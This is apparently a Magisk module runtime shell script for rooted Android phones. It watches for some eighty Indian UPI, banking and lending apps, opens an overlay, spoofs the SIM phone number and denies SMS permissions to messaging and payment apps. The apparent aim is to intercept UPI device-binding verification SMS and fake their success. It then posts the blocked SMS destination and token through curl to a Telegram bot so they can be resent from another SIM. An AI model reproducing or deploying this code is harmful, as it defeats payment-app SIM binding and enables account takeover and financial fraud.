#!/system/bin/sh
# Magisk module runtime — config sync + UPI detect + Virtus floating overlay APK

MODDIR=${0%/*}
. "$MODDIR/overlay_install.sh"

CONFIG="$MODDIR/config.json"
RUNTIME="/data/local/tmp/hivirtus_zygisk_mode_config.json"
ACTIVE_PKG="/data/local/tmp/hivirtus_active_hook_pkg.txt"

UPI_PACKAGES="
com.phonepe.app
net.one97.paytm
com.google.android.apps.nbu.paisa.user
com.yespay.next
com.yesbank.yespay
com.snapmint.customerapp
com.tataneu
com.stashfin.android
com.kreditbee.android
com.dreamplug.androidapp
com.mobikwik_new
com.freecharge.android
in.org.npci.upiapp
com.amazon.mShop.android.shopping
com.popclub.android
com.myairtelapp
com.jio.myjio
com.csam.icici.bank.imobile
com.sbi.lotusintouch
com.axis.mobile
com.hdfcbank.payzapp
com.bankofbaroda.mpassbook
com.idfcfirstbank.mobile
com.kotak811mobilebankingapp
com.whizdm.moneyview.loans
com.naviapp
com.bharatpe.app
com.rapipay
com.fampay.in
com.slice.app
com.postpe.app
com.olacabs.customer
com.application.zomato
in.swiggy.android
com.meesho.supply
com.flipkart.android
com.lazypay.app
com.earlysalary.android
com.whiz.credit
com.zestmoney.android
com.payu.india
com.msf.angelmobile
com.groww.app
com.nextbillion.groww
com.herofincorp.diyjourneys
com.herofincorp.simplycash
com.customer.herofincorp
com.paytmmoney
com.jar.app
com.supermoney
com.epifi.paisa
com.angelbroking.angelone
com.mmt.mmtpay
com.irctc.air
com.truecaller
com.whatsapp
com.samsung.android.spay
com.navi.moneymanager
com.loan.front
com.buddyloan.app
com.rupilo.android
com.moneytap.app
com.paysense.android
com.branch_international.branch.branch_demo_android
com.cashfree
com.razorpay.payments
com.mpokket.app
com.cashe.android
com.rupeeredee.app
com.loan.tap
com.smartcoin
com.kissht.android
com.flexsalary
com.nira.finance
com.availfinance
com.indialends.android
com.homecredit
com.bajajfinserv
com.hdbfs.hdbfsl
in.medibuddy
"

is_upi_pkg() {
  echo "$UPI_PACKAGES" | grep -qx "$1"
}

sync_config() {
  # Runtime JSON overwrite mat karo (telegram wipe) — sirf spoof phone + first-boot seed
  SRC=""
  if [ -f "$RUNTIME" ]; then
    SRC="$RUNTIME"
  elif [ -f "$CONFIG" ]; then
    SRC="$CONFIG"
    cp -f "$CONFIG" "$RUNTIME"
    chmod 644 "$RUNTIME" 2>/dev/null
  fi
  if [ -n "$SRC" ]; then
    SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -n "$SPOOF_PHONE" ]; then
      echo "$SPOOF_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
      echo "$SPOOF_PHONE" > "$MODDIR/spoof_phone.txt"
      chmod 644 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
      chmod 644 "$MODDIR/spoof_phone.txt" 2>/dev/null
    fi
  fi
}

get_foreground_pkg() {
  local pkg

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'topResumedActivity=ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'mResumedActivity: ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'ResumedActivity' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  echo "$pkg"
}

mark_active() {
  echo "$1" > "$ACTIVE_PKG"
  chmod 644 "$ACTIVE_PKG" 2>/dev/null
  date +%s > /data/local/tmp/hivirtus_module_heartbeat.txt
  echo "foreground:$1" >> /data/local/tmp/hivirtus_overlay.debug
  echo "overlay_start:$1" >> /data/local/tmp/hivirtus_overlay.debug
  chmod 644 /data/local/tmp/hivirtus_overlay.debug 2>/dev/null
  hivirtus_start_overlay_service
}

sync_config

# Reboot ke baad APK install + overlay permission + service start
hivirtus_boot_activate_overlay &

(
  LAST=""
  while true; do
    sync_config
    FG=$(get_foreground_pkg)
    if [ -n "$FG" ] && is_upi_pkg "$FG"; then
      if [ "$FG" != "$LAST" ]; then
        mark_active "$FG"
        LAST="$FG"
      fi
    fi
    sleep 2
  done
) &

# Mock SIM ON → Messages/UPI ko SEND_SMS deny (root se — overlay root ke bina bhi)
sms_block_wanted() {
  [ -f /data/local/tmp/hivirtus_spoof_phone.txt ] && return 0
  SRC=""
  [ -f "$RUNTIME" ] && SRC="$RUNTIME"
  [ -z "$SRC" ] && [ -f "$CONFIG" ] && SRC="$CONFIG"
  [ -z "$SRC" ] && return 1
  grep -qE '"hook_outgoing_sms"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"intercept_fake_success"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"enable_virtual_sim"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"enable_sim1_mock"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  grep -qE '"enable_phone_spoof"[[:space:]]*:[[:space:]]*true' "$SRC" 2>/dev/null && return 0
  return 1
}

enforce_sms_block() {
  sms_block_wanted || return 0

  HOOKED=""
  for f in /data/local/tmp/hivirtus_hooked_pkgs.txt /data/local/tmp/hivirtus_active_upi_all.txt; do
    [ -f "$f" ] && HOOKED="$HOOKED $(cat "$f" 2>/dev/null | tr '\n' ' ')"
  done
  if [ -f "$ACTIVE_PKG" ]; then
    HOOKED="$HOOKED $(cat "$ACTIVE_PKG" 2>/dev/null | tr -d '\r\n ')"
  fi
  SRC_CFG=""
  [ -f "$RUNTIME" ] && SRC_CFG="$RUNTIME"
  [ -z "$SRC_CFG" ] && [ -f "$CONFIG" ] && SRC_CFG="$CONFIG"
  if [ -n "$SRC_CFG" ]; then
    HOOKED="$HOOKED $(grep -oE '"[a-zA-Z][a-zA-Z0-9._]*"[[:space:]]*:[[:space:]]*true' "$SRC_CFG" 2>/dev/null | sed 's/"\([^"]*\)".*/\1/' | grep -E '^com\.')"
  fi

  for pkg in com.android.phone com.android.providers.telephony \
    com.google.android.apps.messaging com.android.mms com.android.mms.service \
    com.samsung.android.messaging com.yespay.next com.yesbank.yespay \
    com.kreditbee.android com.groww.app com.nextbillion.groww \
    com.herofincorp.diyjourneys com.herofincorp.simplycash com.customer.herofincorp \
    com.phonepe.app net.one97.paytm com.fampay.in $HOOKED; do
    [ -z "$pkg" ] && continue
    appops set "$pkg" SEND_SMS deny 2>/dev/null
    cmd appops set "$pkg" SEND_SMS deny 2>/dev/null
    appops set "$pkg" WRITE_SMS deny 2>/dev/null
    cmd appops set "$pkg" WRITE_SMS deny 2>/dev/null
  done
  echo 1 > /data/local/tmp/hivirtus_phone_sms_denied.flag
  chmod 644 /data/local/tmp/hivirtus_phone_sms_denied.flag 2>/dev/null
}

forward_blocked_telegram() {
  FLAG="/data/local/tmp/hivirtus_outgoing_blocked.flag"
  [ ! -f "$FLAG" ] && return 0
  TG="/data/local/tmp/hivirtus_telegram_credentials.json"
  [ ! -f "$TG" ] && TG="$MODDIR/telegram_credentials.json"
  [ ! -f "$TG" ] && return 0
  LINE=$(cat "$FLAG" 2>/dev/null | head -n1)
  [ -z "$LINE" ] && return 0
  DEST="${LINE%%|*}"
  BODY="${LINE#*|}"
  TOKEN=$(grep '"telegram_bot_token"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  CHAT=$(grep '"telegram_chat_id"' "$TG" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  [ -z "$TOKEN" ] || [ -z "$CHAT" ] && return 0
  TEXT="📱 Verify SMS Blocked — Fake Success ✅
@hivirtus @liqdy

App: UPI Verify
Real SIM: blocked

To (short code):
${DEST}

Body / Token:
${BODY}"
  SPOOF=$(cat /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null | tr -d '\r\n ')
  if [ -n "$SPOOF" ]; then
    TEXT="${TEXT}

Send FROM (app login / 2nd SIM):
${SPOOF}

Messages se isi number wali SIM se manually bhejo"
  fi
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 20 -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
      --data-urlencode "chat_id=${CHAT}" \
      --data-urlencode "text=${TEXT}" >/dev/null 2>&1
  fi
  am broadcast -a com.hivirtus.zygiskmode.OUTGOING_BLOCKED \
    -n com.hivirtus.zygiskmode/.BlockedSmsReceiver \
    --es dest "$DEST" --es body "$BODY" 2>/dev/null
  rm -f "$FLAG"
}

(
  while true; do
    enforce_sms_block
    forward_blocked_telegram
    sleep 2
  done
) &
